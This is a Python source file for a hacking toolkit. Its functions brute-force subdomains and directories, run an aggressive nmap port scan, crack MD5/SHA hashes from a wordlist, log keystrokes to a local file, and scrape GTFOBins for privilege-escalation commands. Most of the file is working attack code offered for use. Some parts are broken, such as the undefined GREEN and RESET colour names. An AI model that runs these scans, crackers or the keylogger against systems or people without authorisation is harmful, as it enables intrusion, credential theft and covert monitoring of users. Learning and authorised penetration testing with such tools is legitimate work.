import requests,os
import re,sys,nmap
import threading, hashlib,time
from pynput import keyboard
import urllib.parse
from bs4 import BeautifulSoup
from colorama import init, Fore, Style

init(autoreset=True)  # Initialize colorama

def subdomain_enumeration():
    domain = input("Enter the domain name: ")

    # Code for subdomain enumeration task
    print("Executing Subdomain Enumeration...")

    sub_list = open("wordlist.txt").read()
    subdoms = sub_list.splitlines()

    total_subdomains = len(subdoms)
    processed_subdomains = 0

    print("Scanning subdomains...")
    print("Progress: 0.00%", end="")

    # Create a lock for synchronized access to processed_subdomains variable
    lock = threading.Lock()

    def scan_subdomain(subdomain):
        sub_domains = f"http://{subdomain}.{domain}"

        # Skip if the subdomain matches an IP address pattern
        if re.match(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", subdomain):
            return

        try:
            response = requests.get(sub_domains, timeout=3)

        except requests.ConnectionError:
            pass

        else:
            if response.status_code == 200:
                print(GREEN + "[+] Valid domain [+]", sub_domains, "" + RESET)

        # Update progress
        with lock:
            nonlocal processed_subdomains
            processed_subdomains += 1
            progress = (processed_subdomains / total_subdomains) * 100
            sys.stdout.write(f"\rProgress: {progress:.2f}%")
            sys.stdout.flush()

    threads = []
    for sub in subdoms:
        thread = threading.Thread(target=scan_subdomain, args=(sub,))
        threads.append(thread)
        thread.start()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    print("\nSubdomain scanning complete")

#################################
def directory_enumeration():
    # Prompt the user to input the domain
    url = input("Enter the domain: ")
    sub_list = open("wordlist.txt").read()
    directories = sub_list.splitlines()

    total_directories = len(directories)
    processed_directories = 0

    print("Scanning directories...")
    print("Progress: 0.00%", end="")

    # Create a lock for synchronized access to processed_directories variable
    lock = threading.Lock()

    # Function to check the validity of directories
    def check_directory(directory):
        dir_enum = f"http://{url}/{directory}.html"
        r = requests.get(dir_enum)
        if r.status_code != 404:
            print("\nValid directory:", dir_enum)

        # Update progress
        with lock:
            nonlocal processed_directories
            processed_directories += 1
            progress = (processed_directories / total_directories) * 100
            sys.stdout.write(f"\rProgress: {progress:.2f}%")
            sys.stdout.flush()

    # Create a thread for each directory check
    threads = []
    for directory in directories:
        t = threading.Thread(target=check_directory, args=(directory,))
        threads.append(t)
        t.start()

    # Wait for all threads to finish
    for t in threads:
        t.join()

    print("\nDirectory enumeration complete.")

####################################
def port_scanner():
    # Prompt the user to enter the IP address or domain to scan
    target = input("Enter the IP address or domain to scan: ")

    # Create a PortScanner object
    scanner = nmap.PortScanner()

    # Set the desired options
    arguments = '-Pn -n -p1-2500 -T5 --open -vvv'

    # Scan the target with the specified arguments
    print("Scanning ports...")
    scan_result = scanner.scan(target, arguments=arguments)

    # Print scan results
    print("\nScan Results:")
    for host in scanner.all_hosts():
        print("----------------------------------------------------")
        print(f"Host: {host}")
        print(f"State: {scanner[host].state()}")
        for proto in scanner[host].all_protocols():
            print("----------------------------------------------------")
            print(f"Protocol: {proto}")
            ports = scanner[host][proto].keys()
            for port in ports:
                port_state = scanner[host][proto][port]['state']
                port_name = scanner[host][proto][port]['name']
                print(f"Port: {port}\tState: {port_state}\tService: {port_name}")

#######################################
def download_file():
    try:
        file_url = input("Enter the file URL: ")
        response = requests.get(file_url, stream=True)
        response.raise_for_status()  # Raise an exception if the request was unsuccessful
        
        total_size = int(response.headers.get('content-length', 0))
        filename = file_url.split("/")[-1]
        save_path = os.path.join(os.getcwd(), filename)
        
        with open(save_path, 'wb') as file:
            downloaded_size = 0
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    file.write(chunk)
                    downloaded_size += len(chunk)
                    progress = (downloaded_size / total_size) * 100
                    print(f"Downloading... {progress:.2f}%", end="\r")
        
        print("\nFile downloaded successfully.")
        print(f"File size: {total_size} bytes")
    except requests.exceptions.RequestException as e:
        print(f"Failed to download the file: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")

#####################################
def hash_cracker(num_threads=None):
    try:
        wordlist_location = input('Enter wordlist file location: ')
        hash_input = input('Enter hash to be cracked: ')

        def identify_hash_algorithm(hash_input):
            hash_lengths = {
                32: 'md5',
                40: 'sha1',
                64: 'sha256',
                128: 'sha512'
            }
            length = len(hash_input)
            algorithm = hash_lengths.get(length)
            if algorithm:
                return algorithm, length
            else:
                return None, length

        hash_algorithm, hash_length = identify_hash_algorithm(hash_input)

        if hash_algorithm is None:
            print(f"Unable to determine hash algorithm (Length: {hash_length}).")
            return

        def crack_hash(chunk, hash_input):
            for password in chunk:
                password = password.strip()
                hash_ob = hashlib.new(hash_algorithm)
                hash_ob.update(password.encode())
                hashed_pass = hash_ob.hexdigest()
                if hashed_pass == hash_input:
                    print('Found cleartext password: ' + password)
                    return password

        with open(wordlist_location, 'r') as file:
            lines = file.readlines()

        # Set recommended number of threads if num_threads is not provided
        if num_threads is None:
            num_threads = min(4, os.cpu_count() or 1)  # Use minimum of 4 or available CPU cores

        # Create and start the threads
        threads = []
        chunk_size = len(lines) // num_threads
        chunks = [lines[i:i + chunk_size] for i in range(0, len(lines), chunk_size)]

        for i in range(num_threads):
            thread = threading.Thread(target=crack_hash, args=(chunks[i], hash_input))
            thread.start()
            threads.append(thread)

        # Wait for all threads to finish
        for thread in threads:
            thread.join()

        print(f"Hash cracking complete. (Algorithm: {hash_algorithm.upper()}, Length: {hash_length})")
    except FileNotFoundError:
        print("Wordlist file not found.")
    except Exception as e:
        print("An error occurred:", str(e))

###########################################################
def record_keys():
    print("Listening for keys...")

    def on_press(key):
        with open('keylog.txt', 'a') as f:
            if key == keyboard.Key.backspace:
                f.write('[Backspace]')
            elif key == keyboard.Key.enter:
                f.write('[Enter]\n')
            elif key == keyboard.Key.ctrl:
                f.write('[Ctrl]')
            elif hasattr(key, 'char'):
                f.write(key.char)

    def on_release(key):
        if key == keyboard.Key.esc:
            print("Stopping ...")
            # Stop listener when 'Esc' key is pressed
            return False

    # Create a listener for keyboard events
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)

    # Start the listener
    listener.start()

    # Keep the script running until 'Esc' is pressed
    listener.join()

####################################
def search_gtfobins():
    base_url = "https://gtfobins.github.io/gtfobins/"

    # Prompt the user for a search term
    keyword = input("Enter the search term: ")
    
    search_url = base_url + urllib.parse.quote(keyword)

    print(f"Searching GTFOBins for '{keyword}'...\n")

    # Send a GET request to the search URL
    response = requests.get(search_url)

    # Check if the request was successful
    if response.status_code == 200:
        html_content = response.text

        # Extract function names and corresponding commands
        function_pattern = re.compile(r'<h2 id="(\w+)" class="function-name">(.*?)</h2>.*?<pre><code>(.*?)</code></pre>', re.DOTALL)
        matches = re.findall(function_pattern, html_content)

        if matches:
            print(f"{Fore.GREEN}Found {len(matches)} matching results:{Style.RESET_ALL}\n")

            # Iterate over matches and print function name and command
            for match in matches:
                function_name = match[0]
                command = match[2]

                print(f"{Fore.YELLOW}Function: {function_name}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}Command: {command}{Style.RESET_ALL}")
                print()
        else:
            print(f"{Fore.RED}No matching results found.{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}Request failed with status code {response.status_code}.{Style.RESET_ALL}")
##############################